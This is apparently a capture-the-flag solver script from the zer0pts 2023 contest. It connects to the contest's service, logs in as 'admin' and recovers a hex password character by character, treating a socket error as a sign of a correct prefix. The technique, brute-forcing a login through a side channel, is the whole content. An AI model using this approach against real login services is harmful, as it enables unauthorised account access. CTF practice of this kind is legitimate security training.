import socket

succ = False

letters = b"0123456789abcdef"
pwd = b"dd79efc4093c932"

while not succ:
    for letter in letters:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # now connect to the web server on port 80 - the normal http port
        s.connect(("misc3.2023.zer0pts.com", 10021))
        s.settimeout(10)
        print(s.recv(1000))
        s.send(b"admin\n")
        print(s.recv(1000))
        try:
            s.send(pwd + bytes([letter]))
            print(s.recv(1000))
            continue
        except Exception as e:
            print(e)
        pwd += bytes([letter])
        break
    print(pwd)
